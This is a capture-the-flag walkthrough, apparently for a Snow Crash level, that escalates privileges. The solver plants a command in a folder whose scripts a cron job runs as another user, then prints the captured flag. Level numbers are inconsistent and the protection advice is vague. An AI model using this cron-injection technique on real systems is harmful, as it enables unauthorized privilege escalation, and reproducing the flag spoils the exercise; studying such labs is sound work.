# Level02

### Tools


### How to solve it

1. After loging in using ssh in level05@(vmIP): 
```
ssh level02@000.000.000.000 -p 4242
```
2. When loging in we get this message:
```
You have new mail.
```
3. If you give a little research you will find that mails are stored in /var/mail or /var/spool so we find:
```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
4. The command above is a cron file with su -c(switch user and execute command) sh (run the script) flag05(the user) and after that we look for the file openarenaserver and cat this:
```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
5. When the openarenaserver is called it run a program stored in /opt/openarenaserver wish is bash -x "$i" line.
So we now have to insert a file in openarenaserver folder to be executed with getflag command:
```
echo 'getflag > /usr/sbin/flag05' > /opt/openarenaserver/flag05 it will not work because this folder has no permission
echo 'getflag > /tmp/flag05' > /opt/openarenaserver/flag05
```
6. So now we know that this program is being executed every 2 minutes and then we cat the /tmp/flag05
8. And Boom:
```
viuaaale9huek52boumoomioc
```
### How to protect
 - Once someone is inside your system and if you do not monitor it it's because you failed before,  one additional proction would be implemeting passwords in important files

